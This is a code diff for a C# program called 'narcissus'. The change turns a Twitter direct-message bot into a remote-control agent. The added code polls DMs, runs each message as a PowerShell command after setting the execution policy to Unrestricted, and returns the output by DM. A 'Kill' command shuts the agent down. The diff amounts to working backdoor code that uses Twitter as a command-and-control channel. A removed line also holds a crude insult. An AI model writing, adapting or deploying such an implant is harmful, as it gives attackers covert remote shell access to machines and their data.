@@ -10,6 +10,8 @@ using System;
 using System.Collections.Generic;
 using System.Net.Http;
 using System.Linq;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
@@ -194,14 +196,13 @@ namespace narcissus
             return twitterResponse;
         }
 
-        public string Send_DM(string recipientId)
+        public string Send_DM(string recipientId, string message)
         {
             string method = "POST";
             string dmSendUrl = "1.1/direct_messages/events/new.json";
             Dictionary<string, string> sendDMParams = new Dictionary<string, string>();
             sendDMParams.Add("type", "message_create");
             sendDMParams.Add("message_create.target.recipient_id", recipientId);
-            string message = "Boy I'm really about to GET your pickle chin ass";
             sendDMParams.Add("message_create.message_data", message);
 
             string nonce = Convert.ToBase64String(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString("N")));
@@ -235,28 +236,58 @@ namespace narcissus
             JavaScriptSerializer messageParser = new JavaScriptSerializer();
             TwitterResponse responseData;
             DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
-            DateTime latestTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
+            DateTime latestTime = DateTime.Now.ToUniversalTime();
+
+            RunspaceConfiguration nRsConfig = RunspaceConfiguration.Create();
+            Runspace narcissusRs = RunspaceFactory.CreateRunspace(nRsConfig);
+            narcissusRs.Open();
+            RunspaceInvoke nRsInvoker = new RunspaceInvoke(narcissusRs);
+            nRsInvoker.Invoke("Set-ExecutionPolicy -Scope Process Unrestricted");
+
+            string shellOut;
             while (true)
             {
                 try
                 {
+                    shellOut = "";
                     twitterResponse = narcissusMain.Receive_DM();
                     responseData = messageParser.Deserialize<TwitterResponse>(twitterResponse);
                     foreach (Event dmEvent in responseData.events)
                     {
                         if (epoch.AddMilliseconds(Convert.ToDouble(dmEvent.created_timestamp)) > latestTime && dmEvent.message_create.sender_id != "35088627")
                         {
+                            if(dmEvent.message_create.message_data.text == "Kill")
+                            {
+                                narcissusMain.Send_DM(dmEvent.message_create.sender_id, "Acknowledged. Killing narcissus agent.");
+                                return;
+                            }
                             latestTime = epoch.AddMilliseconds(Convert.ToDouble(dmEvent.created_timestamp));
                             Console.WriteLine(latestTime.ToString());
-                            narcissusMain.Send_DM(dmEvent.message_create.sender_id);
+                            Console.WriteLine(dmEvent.message_create.message_data.text);
+                            Pipeline nPipeline = narcissusRs.CreatePipeline();
+                            nPipeline.Commands.Add(dmEvent.message_create.message_data.text);
+                            try
+                            {
+                                foreach (PSObject shellResult in nPipeline.Invoke())
+                                {
+                                    shellOut = shellOut + "Name: " + shellResult.Members["Name"].Value + " ";
+                                }
+                                narcissusMain.Send_DM(dmEvent.message_create.sender_id, shellOut);
+                                nPipeline.Commands.Clear();
+                            } catch (PSInvalidOperationException)
+                            {
+                                narcissusMain.Send_DM(dmEvent.message_create.sender_id, "An invalid PowerShell command was given");
+                            }
+                            nPipeline.Stop();
                         }
                     }
                     Thread.Sleep(60000);
                 }
                 catch (ThreadAbortException)
                 {
+                    narcissusRs.Close();
                     Console.WriteLine("Narcissus listener exited safely");
-                    break;
+                    return;
                 }
             } 
         }
@@ -264,15 +295,10 @@ namespace narcissus
         static void Main(string[] args)
         {
             narcissusHTTPClient.BaseAddress = new Uri("https://api.twitter.com");
+
             Thread listenerThread = new Thread(new ThreadStart(MessageListener));
             listenerThread.Start();
-            Console.WriteLine("Enter 'q' to exit...");
-            string exitChar = "";
-            while (exitChar != "q")
-            {
-                exitChar = Console.ReadLine();
-            }
-            listenerThread.Abort();
+            listenerThread.Join();
         }
     }
 }
